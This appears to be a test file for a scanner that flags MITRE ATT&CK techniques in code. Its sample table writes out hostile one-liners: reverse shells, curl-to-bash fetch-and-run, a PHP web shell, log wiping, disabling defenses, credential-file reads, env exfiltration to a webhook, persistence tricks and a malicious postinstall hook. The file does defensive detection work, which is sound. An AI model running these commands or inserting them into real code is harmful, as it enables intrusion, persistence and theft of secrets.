import { describe, expect, it } from 'vitest';
import { RULES, helpUri, scan } from './adapter.mjs';

// Samples are split with `+` so this file does not match the rules itself.
const HITS = {
  'T1059.004-reverse-shell': ['bash -i >& /dev/' + 'tcp/10.0.0.1/4444 0>&1', 'n' + 'c 10.0.0.1 4444 -e /bin/sh', "pty." + "spawn('/bin/bash')"],
  'T1059-download-execute': ['cu' + 'rl -fsSL https://x.io/i.sh | sudo bash', 'ie' + 'x (New-Object Net.WebClient).DownloadString("http://x")'],
  'T1059.001-encoded-powershell': ['powershell -' + 'enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi'],
  'T1027-decode-eval': ['ev' + 'al(atob(payload))', 'exec(base64.' + 'b64decode(blob))', '<?php ev' + 'al(gzinflate(base64_decode($x)));'],
  'T1505.003-web-shell': ['<?php sys' + 'tem($_GET["c"]); ?>'],
  'T1070-clear-traces': ['his' + 'tory -c', 'rm -rf /var/' + 'log/auth.log', 'wevt' + 'util cl Security'],
  'T1562.001-disable-defenses': ['setenf' + 'orce 0', 'systemctl stop aud' + 'itd', 'Set-MpPreference -DisableRealtimeMonitoring ' + '$true'],
  'T1098.004-ssh-authorized-keys': ['echo "$KEY" >> ~/.ssh/authorized' + '_keys'],
  'T1136-root-account': ['user' + 'add -o -u 0 -g 0 svc'],
  'T1496-cryptominer': ['pool: "stratum' + '+tcp://pool.example:3333"'],
  'T1567-exfil-service': ['fetch("https://abc.webhook' + '.site/x", { body })'],
  'T1567-paste-or-chat-webhook': ['https://discord.com/api/' + 'webhooks/1/abc'],
  'T1552.001-credential-files': ["readFileSync(homedir() + '/.aws/" + "credentials')", 'open("/home/u/.ssh/id_' + 'rsa")'],
  'T1552-env-dump': ['body: JSON.stringify(process' + '.env)'],
  'T1053.003-cron': ['(crontab -l; echo "* * * * * /tmp/x") | cron' + 'tab -'],
  'T1543.002-systemd-service': ['cp agent.service /etc/systemd/' + 'system/'],
  'T1546.004-shell-profile': ['echo "export X=1" >> ~/.bash' + 'rc'],
  'T1547.001-run-key': ['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\' + 'Run'],
  'T1548.001-setuid': ['chm' + 'od u+s /usr/local/bin/helper'],
  'T1105-fetch-chmod-run': ['wg' + 'et http://x/a -O /tmp/a && chmod +x /tmp/a'],
};

const CLEAN = [
  'const shell = process.env.SHELL;',
  'curl -fsSL https://x.io/sha256 -o sums.txt',
  'eval(expression)',
  'chmod 0644 file.txt',
  'chmod 755 build.sh ',
  'cat ~/.ssh/id_' + 'rsa.pub',
  'logger.info("history cleared")',
  'const d = JSON.stringify(process.env.NODE_ENV)',
];

describe('mitre-attack analyzer', () => {
  it('has a sample for every rule, and each sample hits exactly its rule', () => {
    expect(Object.keys(HITS).sort()).toEqual(RULES.filter((r) => !r.files).map((r) => r.id).sort());
    for (const [id, samples] of Object.entries(HITS)) {
      for (const s of samples) expect(scan('src/x.sh', s).map((f) => f.ruleId), s).toEqual([id]);
    }
  });

  it('stays quiet on ordinary code', () => {
    for (const s of CLEAN) expect(scan('src/x.js', s), s).toEqual([]);
  });

  it('flags install hooks that reach out, only in package.json', () => {
    const pkg = '{ "scripts": { "post' + 'install": "cu' + 'rl -s https://x.io/p | node" } }';
    expect(scan('package.json', pkg).map((f) => f.ruleId)).toContain('T1195.002-install-hook');
    expect(scan('pkg/package.json', '{ "scripts": { "post' + 'install": "node build.js" } }')).toEqual([]);
    expect(scan('src/x.json', pkg).map((f) => f.ruleId)).not.toContain('T1195.002-install-hook');
  });

  it('reports security findings with technique, location and ATT&CK link', () => {
    const [f] = scan('deploy/run.sh', 'echo ok\n  his' + 'tory -c');
    expect(f).toMatchObject({ ruleId: 'T1070-clear-traces', file: 'deploy/run.sh', line: 2, column: 3, category: 'security', severity: 'high', helpUri: 'https://attack.mitre.org/techniques/T1070/' });
    expect(f.message).toMatch(/^ATT&CK T1070 /);
    expect(helpUri('T1059.004')).toBe('https://attack.mitre.org/techniques/T1059/004/');
  });

  it('lowers test files one step and skips prose', () => {
    const line = 'his' + 'tory -c';
    expect(scan('tests/run.sh', line)[0].severity).toBe('medium');
    expect(scan('src/run.test.js', line)[0].severity).toBe('medium');
    expect(scan('README.md', line)).toEqual([]);
  });
});
